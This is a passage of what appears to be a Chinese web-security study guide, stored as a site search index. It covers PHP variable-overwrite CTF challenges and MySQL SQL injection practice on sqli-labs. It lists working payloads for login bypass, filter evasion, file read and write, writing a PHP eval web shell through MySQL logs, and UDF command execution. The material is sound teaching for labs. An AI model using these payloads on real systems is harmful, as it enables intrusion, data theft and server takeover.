1){  \n        echo \"private!\";  \n    } else{  \n        echo \"public!\";  \n    }  \n?&gt;\n\u53c2\u6570\uff1aauth=1\n</code></pre> \u8fd9\u6837\uff0c\u8f93\u51faprivatel\u4e86\u3002 \u7ecf\u5178\u9898\u76ee\uff1a <pre><code>&lt;?php\n\n   $flag = \u2018xxx\u2019;\n\n   extract($_GET);\n\n   if (isset($gift)) \n  {\n       $content = trim(file_get_contents($flag));\n\n       if ($gift == $content) \n      {\n            echo \u2018hctf{\u2026}\u2019;\n\n      } \n       else \n      {\n           echo \u2018Oh..\u2019;\n      }\n\n   } \n?&gt;\n</code></pre></p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#parse_str","title":"parse_str()\u51fd\u6570\u5bfc\u81f4\u53d8\u91cf\u8986\u76d6","text":"<p>parse_str() \u51fd\u6570\u7528\u4e8e\u628a\u67e5\u8be2\u5b57\u7b26\u4e32\u89e3\u6790\u5230\u53d8\u91cf\u4e2d\uff0c\u5982\u679c\u6ca1\u6709array \u53c2\u6570\uff0c\u5219\u7531\u8be5\u51fd\u6570\u8bbe\u7f6e\u7684\u53d8\u91cf\u5c06\u8986\u76d6\u5df2\u5b58\u5728\u7684\u540c\u540d\u53d8\u91cf\u3002 \u6781\u5ea6\u4e0d\u5efa\u8bae \u5728\u6ca1\u6709 array\u53c2\u6570\u7684\u60c5\u51b5\u4e0b\u4f7f\u7528\u6b64\u51fd\u6570\uff0c\u5e76\u4e14\u5728 PHP 7.2 \u4e2d\u5c06\u5e9f\u5f03\u4e0d\u8bbe\u7f6e\u53c2\u6570\u7684\u884c\u4e3a\u3002\u6b64\u51fd\u6570\u6ca1\u6709\u8fd4\u56de\u503c\u3002 <pre><code>&lt;?php\nif(empty($_GET['id'])){\n    show_source(__FILE__);\n    die();\n}else{\n    include('flag.php');\n    $a = \"http://blog.51cto.com/12332766\";\n    $id = $_GET['id'];\n    @parse_str($id);\n    if($a[0] == 'yaun'){\n        echo \"yes is flag\";\n    }else{\n        exit('\u5176\u5b9e\u5f88\u7b80\u5355\uff0c\u5176\u5b9e\u5e76\u4e0d\u96be');\n    }\n}\n?&gt;\npayload:id=a[]=yaun\n</code></pre> \u5f53\u4f20\u9012\u53c2\u6570id=a[]=yaun\u7684\u65f6\u5019\uff0c\u7ecf\u8fc7parse_str()\u51fd\u6570\u7684\u5904\u7406\u5c06a\u53d8\u6210\u53d8\u91cf\u3002\u4f46\u662f\u539f\u6765\u6709\u540c\u540d\u7684\u53d8\u91cf\uff0c\u4e8e\u662f\u5c31\u5c06\u539f\u6765\u7684\u53d8\u91cf\u8986\u76d6\u6389\uff0c\u540c\u65f6\u8986\u76d6\u7684\u8fd8\u6709\u53d8\u91cf\u7684\u503c</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#_45","title":"$$\u53d8\u91cf\u8986\u76d6","text":"<p>\u76f4\u63a5\u4e0a\u4ee3\u7801\u770b\uff1a <pre><code>&lt;?php\n$a = 1;\n$b = 2;\n$c = 'a';\n$$c = $b;    //   $a = $b\nvar_dump($a);   //   \u8f93\u51fa2\n?&gt;\n</code></pre> CTF\u7ecf\u5178\u9898\u76ee\uff1a <pre><code>&lt;?php\n   include \u201cflag.php\u201d;\n\n   $_403 = \u201cAccess Denied\u201d;\n\n   $_200 = \u201cWelcome Admin\u201d;\n\n   if ($_SERVER[\"REQUEST_METHOD\"] != \u201cPOST\u201d)\n   {\n         die(\u201cBugsBunnyCTF is here :p\u2026\u201d);\n   }\n   if ( !isset($_POST[\"flag\"]) )\n   {\n         die($_403);\n   }\n   foreach ($_GET as $key =&gt; $value)\n   {\n         $$key = $$value;\n   }\n   foreach ($_POST as $key =&gt; $value)\n   {\n         $$key = $value;\n   }\n   if ( $_POST[\"flag\"] !== $flag )\n   {\n         die($_403);\n   }\n   echo \u201cThis is your flag : \u201c. $flag . \u201c\\n\u201d;\n   die($_200);\n?&gt;\n</code></pre> GET\uff1a_200=flag POST\uff1aflag=abcde </p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#json_decode","title":"json_decode()\u51fd\u6570","text":"<p>\u5148\u4ecb\u7ecd\u4e0bjson\u5b57\u7b26\u4e32\u5427\uff0cjson\u5c31\u662f\u4e00\u79cd\u6570\u636e\u4ea4\u6362\u683c\u5f0f\uff0c\u5728 JS \u8bed\u8a00\u4e2d\uff0c\u4e00\u5207\u90fd\u662f\u5bf9\u8c61\u3002\u56e0\u6b64\uff0c\u4efb\u4f55\u652f\u6301\u7684\u7c7b\u578b\u90fd\u53ef\u4ee5\u901a\u8fc7 JSON \u6765\u8868\u793a\uff0c\u4f8b\u5982\u5b57\u7b26\u4e32\u3001\u6570\u5b57\u3001\u5bf9\u8c61\u3001\u6570\u7ec4\u7b49\u3002\u4f46\u662f\u5bf9\u8c61\u548c\u6570\u7ec4\u662f\u6bd4\u8f83\u7279\u6b8a\u4e14\u5e38\u7528\u7684\u4e24\u79cd\u7c7b\u578b\uff1a <pre><code>\u5bf9\u8c61\u8868\u793a\u4e3a\u952e\u503c\u5bf9\n\u6570\u636e\u7531\u9017\u53f7\u5206\u9694\n\u82b1\u62ec\u53f7\u4fdd\u5b58\u5bf9\u8c61\n\u65b9\u62ec\u53f7\u4fdd\u5b58\u6570\u7ec4\n</code></pre> \u7ecf\u5178\u4f8b\u9898\uff1a <pre><code>&lt;?php\nif (isset($_POST['message'])) {\n    $message = json_decode($_POST['message']);\n    $key =\"*********\";\n    if ($message-&gt;key == $key) {\n        echo \"flag\";\n    } \n    else {\n        echo \"fail\";\n    }\n }\n else{\n     echo \"~~~~\";\n }\n?&gt;\n\npayload: message={\"key\":0}\n</code></pre> \u8fd9\u4e2apayload\u5229\u7528\u7684\u8fd8\u662fphp\u5b57\u7b26\u6bd4\u8f83\u7684\u6f0f\u6d1e\uff0c0==\u2019admin\u2019</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-PHP%E7%AF%87/#switch","title":"switch()\u51fd\u6570\u6f0f\u6d1e","text":"<p>switch\u51fd\u6570\u662fphp\u4e2d\u7684\u6761\u4ef6\u5206\u652f\u8bed\u53e5\uff0c\u901a\u8fc7\u5bf9switch\u4e2d\u7684\u53c2\u6570\u503c\u8fdb\u884c\u5224\u65ad\uff0c\u9009\u62e9case\u4e2d\u7684\u4ee3\u7801\u53bb\u6267\u884c\uff0c\u4f46\u662f\u4f1a\u5c06switch\u4e2d\u7684\u53c2\u6570\u8f6c\u6362\u4e3aint\u7c7b\u578b\uff0c\u90a3\u4e48\u95ee\u9898\u5c31\u6765\u4e86\uff0c\u5728\u8fdb\u884c\u7c7b\u578b\u8f6c\u6362\u7684\u65f6\u5019\uff0c\u20191admin\u2019\u20191\u2019\u7684\u3002 \u7ecf\u5178\u9898\u76ee\uff1a <pre><code>&lt;?php\n$i =\"2abc\";  \nswitch ($i) {  \ncase 0:  \ncase 1:  \ncase 2:  \necho \"i is less than 3 but not negative\";  \nbreak;  \ncase 3:  \necho \"i is 3\";  \n} \n// \u8f93\u51fa\u4e86 i is less than 3 but not negative\n?&gt;\n</code></pre> switch\u8fd8\u6709\u4e00\u4e2a\u7279\u522b\u5de7\u5999\u7684\u5751\uff0c\u4ee3\u7801\u5982\u4e0b <pre><code>&lt;?php\n$a=0;\n switch($a){\n    case $a&gt;=0: echo 0;break;\n    case $a&gt;=10:echo 1;break; // \u8f93\u51fa1\n    default: echo 2;break;    \n }\n?&gt;\n</code></pre> \u8fd9\u4e2a\u4ee3\u7801\uff0c\u5de7\u5999\u5728\u54ea\u91cc\uff1f \u7b2c\u4e00\u4e2a\u5206\u652f\u5224\u65ad\u8bed\u53e5\uff0c\u5e76\u4e0d\u4f1a\u6210\u7acb\uff0c\u56e0\u4e3acase\u7684\u6761\u4ef6\u662f 0&gt;=0 \uff0c\u4e5f\u5c31\u662f true \uff0c\u4f46\u662f\u53c2\u6570\\(a\u4e3a0\uff0c\u4e24\u8005\u5e76\u4e0d\u76f8\u7b49\uff0c\u4f46\u662f\u7b2c\u4e8c\u4e2a\u5206\u652f\u8bed\u53e5\u7684case\u6761\u4ef6\u4e3a 0&gt;=10 \uff0c\u4e5f\u5c31\u662ffalse\uff0c\u53c2\u6570\\)a\u7684\u503c\u4e3a0\uff0c\u20190\u2019\u2019false\u2019,\u6240\u4ee5case $a&gt;=10\u6210\u7acb\u3002</p> <p>\u63a5\u4e0b\u6765\u8fdb\u5165\u6f0f\u6d1e\u5b66\u4e60\u7bc7\u7ae0</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/","title":"SQL\u6ce8\u5165","text":"<p> \u7ea6 5906 \u4e2a\u5b57  44 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 20 \u5206\u949f</p> <p>Note</p> <p>\u76ee\u524d\u53ea\u6709\u5173\u4e8emysql\u7684\u6ce8\u5165\uff0c\u671f\u5f85\u8865\u5145</p> <p>\ud83d\udccesqli-labs-master.zip</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_1","title":"\u5173\u4e8e\u9776\u573a\u642d\u5efa","text":"<ol> <li> <p>php\u7248\u672c\u95ee\u9898</p> <p>PHP\u7248\u672c\u4e0d\u517c\u5bb9\u7684\u7f18\u6545\uff0c\u53ef\u4ee5\u901a\u8fc7\u628aPHP\u7248\u672c\u6362\u52305.x\u7248\u672c\u89e3\u51b3\uff0c\u7ecf\u8fc7\u5c1d\u8bd5\u6700\u4f18\u9009\u62e9\u5e94\u8be5\u662f5.4.45\u7248\u672c \u56e0\u4e3aPHP5.x\u7248\u672c\u65f6\uff0cphp\u8fde\u63a5Mysql\u6570\u636e\u5e93\u4f1a\u4f7f\u7528<code>mysql_connect()</code>\u8fde\u63a5\uff0cPHP7.x\u7248\u672c\u8fde\u63a5\u6570\u636e\u5e93\u4f1a\u4f7f\u7528<code>mysqli_connect()</code>\u8fde\u63a5\uff0c\u800cGitHub\u4e0a\u7684\u6e90\u7801\u6700\u8fd1\u66f4\u65b0\u5df2\u7ecf\u662f\u4e94\u5e74\u524d\u4e86\uff0c\u6240\u4ee5\u5bf9PHP\u9ad8\u7248\u672c\u4f1a\u51fa\u73b0\u4e0d\u517c\u5bb9\u7684\u60c5\u51b5\u3002</p> <p>\u5173\u4e8e\u5c06<code>magic_quotes_gpc</code>\u6539\u4e3a<code>off</code>\uff08\u5f00\u542f<code>magic_quotes_gpc=on</code>\u4e4b\u540e\uff0c\u76f8\u5f53\u4e8e\u4f7f\u7528<code>addslshes()</code>\u8fd9\u4e2a\u51fd\u6570\uff0c\u4f1a\u5728\u5355\u5f15\u53f7\u524d\u52a0\u53cd\u659c\u7ebf\u6ce8\u91ca\uff09\u4ee5\u907f\u514d\u5355\u5f15\u53f7\u88ab\u81ea\u52a8\u52a0\u53cd\u659c\u7ebf\uff08/\uff09\u6ce8\u91ca\u6389\u7684\u95ee\u9898\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u6362php\u7248\u672c\u6765\u89e3\u51b3</p> </li> <li> <p>mysql\u7248\u672c\u95ee\u9898</p> <p>\u7ecf\u6d4b\u8bd5\u4f4e\u7248\u672c\u5728\u67e5\u8868\u65f6\u4f1a\u51fa\u9519\uff0c\u6545\u76f4\u63a5\u4f7f\u7528\u6700\u65b0\u7248\u672c\u53738.0.12\u7248\u672c\u5373\u53ef</p> </li> <li> <p>\u5173\u4e8e\u914d\u7f6e\u6587\u4ef6\u7684\u95ee\u9898</p> <p>\u4e0b\u9762\u8fd9\u7bc7\u535a\u5ba2\u91cc\u6536\u5f55\u4e00\u4e9b\u5e38\u89c1\u95ee\u9898\uff0c\u91cc\u9762\u7684\u5751\u5168\u90fd\u8e29\u8fc7\u4e00\u904d https://blog.csdn.net/qq_43968080/article/details/103613087</p> </li> <li> <p>80\u7aef\u53e3\u88ab\u5360\u7528\u95ee\u9898</p> <p>\u8fd9\u4e2a\u95ee\u9898\u53ef\u80fd\u5c5e\u4e8e\u4e2a\u522b\u73b0\u8c61\uff0c\u4f46\u662f\u56f0\u6270\u6211\u5f88\u4e45\uff0c\u4e8e\u662f\u5728\u6b64\u4e5f\u8bb0\u5f55\u4e0b\u6765</p> <p>\u7b2c\u4e00\u7c7b\uff1a\u88absystem\u5360\u7528\uff0c\u53c2\u8003https://www.cnblogs.com/selier/p/9514426.html https://blog.csdn.net/weixin_44248000/article/details/103432778</p> <p>\u7b2c\u4e8c\u7c7b\uff1a\u88abhttpd.exe\u5360\u7528\uff0c\u53c2\u8003https://blog.csdn.net/speedwaycl/article/details/49023223 \u4e00\u4e2a\u672a\u7ecf\u5c1d\u8bd5\u7684\u89e3\u51b3\u529e\u6cd5https://www.cnblogs.com/starksoft/p/9131665.html</p> </li> </ol>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#mysql","title":"Mysql","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_2","title":"\u539f\u7406\u53ca\u57fa\u672c\u601d\u8def","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_3","title":"\u539f\u7406","text":"<p>\u5b66\u4e60\u524d\u5efa\u8bae\u5148\u4e86\u89e3\u57fa\u7840\u7684mysql\u8bed\u8a00</p> <p>\u5f53\u6211\u4eec\u8bbf\u95ee\u52a8\u6001\u7f51\u9875\u65f6, Web \u670d\u52a1\u5668\u4f1a\u5411\u6570\u636e\u8bbf\u95ee\u5c42\u53d1\u8d77 Sql \u67e5\u8be2\u8bf7\u6c42\uff0c\u5982\u679c\u6743\u9650\u9a8c\u8bc1\u901a\u8fc7\u5c31\u4f1a\u6267\u884c Sql \u8bed\u53e5\u3002 \u8fd9\u79cd\u7f51\u7ad9\u5185\u90e8\u76f4\u63a5\u53d1\u9001\u7684Sql\u8bf7\u6c42\u4e00\u822c\u4e0d\u4f1a\u6709\u5371\u9669\uff0c\u4f46\u5b9e\u9645\u60c5\u51b5\u662f\u5f88\u591a\u65f6\u5019\u9700\u8981\u7ed3\u5408\u7528\u6237\u7684\u8f93\u5165\u6570\u636e\u52a8\u6001\u6784\u9020 Sql \u8bed\u53e5\uff1b\u5f53\u7528\u6237\u4f7f\u7528sql\u67e5\u8be2\u8bed\u53e5\u65f6\u6ca1\u6709\u9075\u5faa\u4ee3\u7801\u4e0e\u6570\u636e\u5206\u79bb\uff0c\u8f93\u5165\u7684\u6570\u636e\u5c31\u4f1a\u88ab\u5f53\u4f5c\u4ee3\u7801\u6267\u884c</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_4","title":"\u601d\u8def","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#sql_1","title":"\u5224\u65ad\u662f\u5426\u5b58\u5728sql\u6ce8\u5165","text":"<p>\u5224\u65ad\u65b9\u6cd5\uff1a</p> <ol> <li> <p>id\u540e\u52a0\u5355\u5f15\u53f7\uff0c\u6839\u636e\u9519\u8bef\u63d0\u793a\u83b7\u53d6\u4fe1\u606f\uff08\u5b57\u7b26\u578b\u6ce8\u5165\uff09</p> <p>\u539f\u7406\u662f\u5355\u5f15\u53f7\u6210\u529f\u88ab\u6570\u636e\u5e93\u89e3\u6790\uff0c\u800c\u65e0\u8bba\u5b57\u7b26\u578b\u8fd8\u662f\u6574\u578b\u90fd\u4f1a\u56e0\u4e3a\u5355\u5f15\u53f7\u4e2a\u6570\u4e0d\u5339\u914d\u800c\u62a5\u9519\uff08\u65e0\u62a5\u9519\u5e76\u4e0d\u4ee3\u8868\u4e0d\u5b58\u5728sql\u6ce8\u5165\u6f0f\u6d1e\uff0c\u56e0\u4e3a\u9875\u9762\u53ef\u80fd\u5bf9\u5355\u5f15\u53f7\u4f5c\u4e86\u8fc7\u6ee4\uff0c\u8fd9\u65f6\u53ef\u4ee5\u8003\u8651\u4f7f\u7528\u5224\u65ad\u8bed\u53e5\u8fdb\u884c\u6ce8\u5165\uff09</p> <p>\u4f8b\u5982</p> <p><code>id=1' order by 1%23</code></p> <p>\u9875\u9762\u56de\u663e\u7684sql\u8bed\u53e5\u662f</p> <p><code>SELECT * FROM users WHERE id='1' order by 1#'LIMIT0,1</code></p> <p>\u7531\u4e8e<code>#</code>\u540e\u9762\u7684\u8bed\u53e5\u90fd\u4f1a\u88ab\u6ce8\u91ca\u6389\uff0c\u6240\u4ee5\u771f\u6b63\u6267\u884c\u7684\u8bed\u53e5\u662f</p> <p><code>SELECT * FROM users WHERE id='1' order by 1</code></p> <p>\u6b64\u5904<code>%23</code>\u5373\u4e3aurl\u7f16\u7801\u4e2d\u7684<code>#</code>\uff0c\u5728mysql\u4e2d<code>#</code>\u7684\u4f5c\u7528\u662f\u6ce8\u91ca\u7b26\uff08<code>--+</code>\uff1b<code>--</code> \uff1b<code>#</code>\uff1b\u5747\u4e3a\u6ce8\u91ca\u7b26\u53f7\uff09</p> </li> <li> <p><code>1=1</code>\u3001<code>1=2</code>\u6d4b\u8bd5\u6cd5\uff0c\u6d41\u7a0b\u5982\u4e0b\uff08\u6570\u5b57\u578b\u6ce8\u5165\uff09</p> <p>\u2460 <code>url?id=1</code>\u2461 <code>url?id=1 ;and 1=1</code>\u2462 <code>url?id=1 ;and 1=2</code></p> <p>\u5b58\u5728\u6ce8\u5165\u6f0f\u6d1e\u7684\u8868\u73b0:</p> <p>\u539f\u7406\u662f:\u5224\u65ad\u539f\u7f51\u5740\u662f\u5426\u5bf9\u8f93\u5165\u4fe1\u606f\u6709\u8fc7\u6ee4</p> <p>\u2460 \u6b63\u5e38\u663e\u793a\uff1b\u2461 \u6b63\u5e38\u663e\u793a\uff0c\u5185\u5bb9\u57fa\u672c\u4e0e\u2460\u76f8\u540c\uff1b\u2462 \u63d0\u793a<code>BOF</code>\u6216<code>EOF</code>\uff08\u7a0b\u5e8f\u6ca1\u505a\u4efb\u4f55\u5224\u65ad\u65f6\uff09\u3001\u6216\u63d0\u793a\u627e\u4e0d\u5230\u8bb0\u5f55\uff08\u5224\u65ad\u4e86rs.eof\u65f6\uff09\u3001\u6216\u663e\u793a\u5185\u5bb9\u4e3a\u7a7a\uff08\u7a0b\u5e8f\u52a0\u4e86<code>on error resume next</code>\uff09</p> <p>\u4e0d\u5b58\u5728\u7684\u8868\u73b0\uff1a</p> <p>\u2460\u540c\u6837\u6b63\u5e38\u663e\u793a\uff0c\u2461\u548c\u2462\u4e00\u822c\u90fd\u4f1a\u6709\u7a0b\u5e8f\u5b9a\u4e49\u7684\u9519\u8bef\u63d0\u793a\uff0c\u6216\u63d0\u793a\u7c7b\u578b\u8f6c\u6362\u65f6\u51fa\u9519\u3002</p> <p>\u8fd8\u53ef\u4ee5\u4f7f\u7528\u7279\u5b9a\u51fd\u6570\u6765\u5224\u65ad\uff0c\u6bd4\u5982\u8f93\u5165<code>1 and version()&gt;0</code>\uff0c\u7a0b\u5e8f\u8fd4\u56de\u6b63\u5e38\uff0c\u8bf4\u660e<code>version()</code>\u51fd\u6570\u88ab\u6570\u636e\u5e93\u8bc6\u522b\u5e76\u6267\u884c\uff0c\u800c<code>version()</code>\u51fd\u6570\u662fMySQL\u7279\u6709\u7684\u51fd\u6570\uff0c\u56e0\u6b64\u53ef\u4ee5\u63a8\u65ad\u540e\u53f0\u6570\u636e\u5e93\u4e3aMySQL\u3002</p> <p>\u6570\u5b57\u578b\u6ce8\u5165\u5e38\u7528\u603b\u7ed3</p> \u70b9\u51fb\u5c55\u5f00/\u6536\u8d77 <pre><code>and1=2--+\n\n'and1=2--+\n\n\"and1=2--+\n\n)and1=2--+\n\n')and1=2--+\n\n\")and1=2--+\n\n\"))and1=2--+\n</code></pre> <p>tips</p> <p>\u6570\u5b57\u578b\u6ce8\u5165\u65f6\uff0c\u53ef\u4ee5\u4e0d\u7528\u903b\u8f91\u8fd0\u7b97\uff0c\u7528\u6570\u5b57\u8fd0\u7b97\u3002</p> <p><code>+</code> <code>-</code> <code>*</code> <code>/</code> <code>div</code> <code>mod</code></p> <pre><code>select 2-(select 1)\nselect 4 div(select 3)\n</code></pre> </li> </ol>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SQL%E7%AF%87/#_5","title":"\u6f0f\u6d1e\u5229\u7528\u624b\u6cd5","text":"<ol> <li> <p>\u5229\u7528 Sql \u6f0f\u6d1e\u7ed5\u8fc7\u767b\u5f55\u9a8c\u8bc1</p> <p>\u5229\u7528\u6ce8\u91ca\u7b26#\u548c1=1\u7684\u6052\u6210\u7acb\u6765\u7ed5\u8fc7\u767b\u9646\u9a8c\u8bc1</p> <p>\u4e00\u822c\u60c5\u51b5\u4e0b\u5f31\u7c7b\u578b\u5bc6\u7801\u662f\u5f88\u96be\u624b\u52a8\u7206\u7834\u7684\uff0c\u4f8b\u5982123</p> <p>\u4f46\u662f\u82e5\u5b58\u5728sql\u6f0f\u6d1e\uff0c\u5728\u7528\u6237\u540d\u4e2d\u8f93\u5165 <code>123' or 1=1 #</code>, \u5bc6\u7801\u8f93\u5165 <code>123' or 1=1 #</code>\uff08\u4e5f\u53ef\u7a7a\u767d\uff09\uff0c\u5219\u53ef\u4ee5\u9a8c\u8bc1\u6210\u529f</p> <p>\u5b9e\u9645\u6267\u884c\u7684\u8bed\u53e5\u662f\uff1a</p> <p><code>select * from users where username='123' or 1=1 #' and password='123' or 1=1 #'</code></p> <p>\u6309\u7167 Mysql \u8bed\u6cd5\uff0c# \u540e\u9762\u7684\u5185\u5bb9\u4f1a\u88ab\u5ffd\u7565\uff0c\u6240\u4ee5\u5b9e\u9645\u6267\u884c\u7684\u8bed\u53e5\u5982\u4e0b</p> <p><code>select * from users where username='123' or 1=1</code></p> <p>\u5728\u7528\u6237\u540d\u4e2d\u8f93\u5165 <code>123' or '1'='1</code>, \u5bc6\u7801\u8f93\u5165 <code>123' or '1'='1</code>\uff08\u4e0d\u52a0\u5355\u5f15\u53f7\u4f1a\u9020\u6210\u8bed\u6cd5\u9519\u8bef\uff09\uff0c\u5b9e\u9645\u6267\u884c\u8bed\u53e5\u5982\u4e0b</p> <p><code>select * from users where username='123' or '1'='1' and password='123' or '1'='1</code></p> <p>or\u6761\u4ef6\u4f7fand\u4e24\u7aef\u9a8c\u8bc1\u7ed3\u679c\u6709\u4e00\u4e2a\u6210\u7acb\u5373\u53ef\u90fd\u6210\u7acb\uff0c\u4ece\u800c\u7ed5\u8fc7\u9a8c\u8bc1\uff0c\u65e0\u9700\u4f7f\u7528\u6ce8\u91ca\u7b26</p> </li> <li> <p>\u81ea\u5e26\u51fd\u6570\u6765\u63a2\u6d4b\u663e\u4f4d</p> <pre><code>system_user() //\u7cfb\u7edf\u7528\u6237\u540d\nuser() //\u7528\u6237\u540d\ncurrent_user //\u5f53\u524d\u7528\u6237\u540d\nsession_user() //\u8fde\u63a5\u6570\u636e\u5e93\u7684\u7528\u6237\u540d\ndatabase() //\u6570\u636e\u5e93\u540d\nversion() //MYSQL\u6570\u636e\u5e93\u7248\u672c\n@@datadir //\u8bfb\u53d6\u6570\u636e\u5e93\u8def\u5f84\n@@basedir //MYSQL \u5b89\u88c5\u8def\u5f84\n@@version_compile_os //\u64cd\u4f5c\u7cfb\u7edf\n</code></pre> </li> <li> <p>\u7a7a\u683c\u548c\u6ce8\u91ca</p> <p>http\u4e2d <code>%20</code> <code></code> <code>+</code> \u90fd\u662f\u7a7a\u683c</p> <p>mysql\u4e2d <code>%09</code> <code>%0A</code> <code>%0B</code> <code>%0C</code> <code>%0D</code>\u90fd\u662f\u7a7a\u767d\u7b26\uff0c\u6548\u679c\u548c<code>%20</code>\u4e00\u6837\uff0clinux\u53ef\u80fd\u8fd8\u652f\u6301<code>%A0</code></p> <p>\u7279\u6b8a\u7b26\u53f7\uff0c\u6ce8\u91ca\uff0c\u4e5f\u53ef\u4ee5\u5f53</p> <pre><code>    select user() # \u88ab\u6ce8\u91ca\u7684\u5185\u5bb9\n    select user() -- \u88ab\u6ce8\u91ca\u7684\u5185\u5bb9\n    select/*\u88ab\u6ce8\u91ca\u7684\u5185\u5bb9*/user()\n    /*!50000Select*/user()\n</code></pre> <p>\u5176\u4e2d<code>/*!50000Select*/user()</code>\u4e3a\u5185\u8054\u6ce8\u91ca</p> <p>\u5f53mysql\u7248\u672c\u53f7 \u2265 5.00.00\uff1a\u6ce8\u91ca\u5185\u5bb9\u4f1a\u88ab\u6267\u884c\uff0c\u76f8\u5f53\u4e8e <code>Select user()</code></p> <p>\u5c0f\u4e8e\u7684\u65f6\u5019\u4e0d\u4f1a\u6267\u884c</p> <p>\u6ce8\u91ca\u4e5f\u53ef\u4ee5\u5d4c\u5957\u4f7f\u7528</p> <pre><code>    select/*adsafsadf/*asfdasf*/user()\n    select user()/*!50000union/*!50000select*/database()\n</code></pre> </li> <li> <p>\u8fd0\u7b97\u7b26</p> <p>and\u4e3a\u903b\u8f91\u8fd0\u7b97\u7b26\uff0c\u53ef\u88ab <code>or</code> <code>xor</code> <code>not</code>\u4ee3\u66ff\uff0c\u540c\u65f6<code>and=&amp;&amp;</code> <code>or=||</code> <code>xor=^</code> <code>not=!</code></p> <p><code>select * from user where not(0=1);</code></p> </li> <li> <p>\u6587\u4ef6\u8bfb\u53d6\u5bfc\u51fa</p> <p>outfile\u548cdumpfile\uff0c\u5fc5\u987broot\uff0c\u5fc5\u987b\u5f00\u542f<code>secure_file_priv</code>\uff0c\u5fc5\u987b\u6709\u7edd\u5bf9\u8def\u5f84\uff0c\u5fc5\u987b\u62fc\u63a5\u5728<code>select</code>\u6700\u540e\uff0c\u5fc5\u987b\u53ef\u4ee5\u4f7f\u7528\u5355\u5f15\u53f7\u3002\u5982\u679c\u65e0\u6cd5\u63a7\u5236\u67e5\u8be2\u6700\u7ec8\u5185\u5bb9\uff0c<code>outfile</code>\u53ef\u62fc\u63a5\u5982\u4e0b4\u4e2a\u3002</p> <p><code>lines terminated by</code> <code>lines starting by</code> <code>fields terminated by</code> <code>columns terminated by</code></p> <pre><code>select * from user where id=1 union select 1,'&lt;?php phpinfo();&gt;',3,4 into dumpfile '/home/1.php'\nselect * from user where id =1 order by 1 limit 0,1 into outfile '/home/1.php' lines terminated by '&lt;?php phpinfo();&gt;'\n</code></pre> <p>load_file, \u5fc5\u987broot\uff0c\u5fc5\u987b\u5f00\u542f<code>secure_file_priv</code>\uff0c\u5fc5\u987b\u6709\u7edd\u5bf9\u8def\u5f84</p> <pre><code>select load_file('/home/1.php')\n</code></pre> <p>bypass \u5355\u5f15\u53f7</p> <pre><code>select 'root'\nselect char(114,111,111,116)\nselect 0x726F6F74\n</code></pre> </li> <li> <p>\u9ad8\u7248\u672c\u7684\u4e00\u4e9btips</p> <p>\u5728mysql5.7\u7248\u672c\uff0c\u65b0\u589e\u4e86sys\u516c\u5171\u5e93\uff0c\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u5728<code>information</code>\u88ab\u8fc7\u6ee4\u4e86\u4e4b\u540e\u4f7f\u7528sys\u5e93\u91cc\u7684\u4e00\u4e9b\u8868\u6765\u67e5\u8be2\u5e93\u548c\u8868</p> <pre><code>SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;\nSELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;\nSELECT table_name FROM sys.schema_table_statistics WHERE table_schema='test' GROUP BY table_name;\nSELECT table_name FROM  sys.x$schema_flattened_keys WHERE table_schema='test' GROUP BY table_name;\n</code></pre> <p>mysql8.0.21\u4e4b\u540e\uff0c\u589e\u52a0<code>table</code>\u548c<code>information_schema.TABLESPACES_EXTENSIONS</code></p> <pre><code>(table information_schema.TABLESPACES_EXTENSIONS limit 0,1)\n</code></pre> <p>\u589e\u52a0<code>values</code></p> <pre><code>select 1,2,3 where 1 = 1 union values row(1,2,3)\n</code></pre> </li> <li> <p>log\u5199\u5165shell</p> <pre><code>show global variables like '%general_log%';\nset global general_log=on;\nset global general_log_file='D://x.php';\nselect \"&lt;?php eval($_POST['x']) ?&gt;\";\nset global general_log=off;\n</code></pre> <pre><code>show global variables like '%query_log%';\nset global slow_query_log=on;\nset global slow_query_log_file='D://x.php';\nshow variables like '%log%';\nselect '&lt;?php phpinfo();?&gt;' from mysql.db where sleep(2);\nset global slow_query_log=off;\n</code></pre> </li> <li> <p>udf\u63d0\u6743</p> <pre><code>select @@basedir;\nshow variables like '%plugins%';\ncreate function cmdshell returns string soname 'udf.dll';\nselect cmdshell('whoami');\nselect * from mysql.func;\ndelete from mysql.func where name='cmdshell';\n</code></pre> 